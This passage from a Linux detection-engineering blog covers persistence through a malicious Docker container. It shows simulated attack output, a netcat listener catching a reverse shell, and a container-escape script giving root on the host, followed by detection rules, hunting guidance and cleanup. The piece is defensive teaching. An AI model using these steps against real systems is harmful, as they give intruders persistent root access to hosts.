[+] Reverse shell is executed every minute.
[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'.
[+] Docker container persistence established!
```

After catching the shell on the attacker’s machine, run the `/usr/local/bin/escape.sh` script to escape the container:

```
❯ nc -nvlp 2021
listening on [any] 2021 ...
connect to [192.168.211.131] from (UNKNOWN) [192.168.211.151] 44726

9543f7ce4c6a:/$ /usr/local/bin/escape.sh
root@debian10-persistence:~# hostname
debian10-persistence
```

Upon execution, the following logs are generated:

![PANIX malicious-container module execution visualized in Kibana](/assets/images/approaching-the-summit-on-persistence/image6.png)

The execution of `panix.sh` initiates the creation of the `/tmp/Dockerfile`. The build command is then executed to create the container based on the specified configuration. Once built, the container is launched with the `--privileged` and `--pid=host` flags, enabling the necessary capabilities for host escape. Upon startup, the container runs the `/usr/local/bin/entrypoint.sh` script, which successfully establishes a reverse shell connection to the attacker’s machine using `socat`. After the shell is caught, the `/usr/local/bin/escape.sh` script is executed, effectively breaking out of the container and gaining access to the host.

Let’s take a look at the coverage:

*Detection and endpoint rules that cover malicious Docker container persistence*

| Category | Coverage |
| :---- | :---- |
| Process | [Privileged Docker Container Creation](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/execution_potentially_overly_permissive_container_creation.toml) <br />[Docker Escape via Nsenter](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_docker_escape_via_nsenter.toml) <br /> [Potential Chroot Container Escape via Mount](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_docker_mount_chroot_container_escape.toml) <br /> [Potential Privilege Escalation via Container Misconfiguration](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_container_util_misconfiguration.toml) <br /> [Potential Privilege Escalation through Writable Docker Socket](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/privilege_escalation_writable_docker_socket.toml) |
| Network | [Egress Connection from Entrypoint in Container](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/execution_egress_connection_from_entrypoint_in_container.toml) |

Besides the rules mentioned above, we also have a dedicated set of container rules that leverages our [Defend for Containers integration](https://www.elastic.co/guide/en/integrations/current/cloud_defend.html), which can be found in the [cloud_defend](https://github.com/elastic/detection-rules/tree/main/rules/integrations/cloud_defend) directory of our [detection-rules repository](https://github.com/elastic/detection-rules). We have also extended our protections through the integration of Falco with Elastic Security. This integration significantly enhances threat detection directly at the edge — whether in Docker containers, Kubernetes clusters, Linux virtual machines, or bare metal environments. By introducing dedicated Falco connectors, we've strengthened Elastic's capabilities to improve cloud workload protection and endpoint security strategies.

For a deeper dive into how our Falco integration secures container workloads, check out our recent blog, *“[Securing the Edge: Harnessing Falco’s Power with Elastic Security for Cloud Workload Protection](https://www.elastic.co/blog/falco-elastic-security-cloud-workload-protection)”*. The blog covers Falco setup, rule creation, alerting, and explores various threat scenarios.

You can revert the changes made by PANIX by running the following revert command:

```
> ./panix.sh --revert malicious-container

[+] Stopping and removing the 'malicious-container'...
[+] Container 'malicious-container' stopped and removed.
[+] Removing Docker image 'malicious-container'...
[+] Docker image 'malicious-container' removed.
[+] Removing Dockerfile at /tmp/Dockerfile...
[+] Dockerfile removed.
```

### Hunting for T1610 - Deploy Container: Malicious Docker Container 

We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious container activity and configurations. The approach includes monitoring for the following:

* **Unusual network connections from Docker containers:** Tracks connections to external or non-local IP addresses initiated by processes under `/var/lib/docker/*`.  
* **Privileged Docker containers:** Identifies containers running in privileged mode, which pose a higher risk of host compromise.  
* **Recently created containers and images:** Observes Docker containers and images created or pulled within the last 7 days to detect unauthorized deployments or suspicious additions.  
* **Sensitive host directory mounts:** Monitors container mounts accessing paths like `/var/run/docker.sock`, `/etc`, or the root directory (`/`), which could enable container escape or unauthorized host access.

By combining the [Persistence via Docker Container](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_malicious_docker_container.md) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1610](https://attack.mitre.org/techniques/T1610/).

# Conclusion

In this fourth chapter of the "Linux Detection Engineering" series, we examined additional persistence techniques that adversaries may leverage on Linux systems. We explored the abuse of PAM modules and `pam_exec` for executing malicious code during authentication events. After PAM, we looked into installer package manipulation via `RPM` and `DPKG`, where lifecycle scripts are weaponized for persistence during the package installation/updating process. We finalized this part by examining malicious Docker containers, detailing how privileged containers and host-level access can be exploited for persistence and container escape.

These techniques underscore the ingenuity and variety of methods adversaries can employ to persist on Linux systems. By leveraging [PANIX](https://github.com/Aegrah/PANIX) to simulate these attacks and using the tailored ES|QL and OSQuery detection queries provided, you can build robust defenses and fine-tune your detection strategies.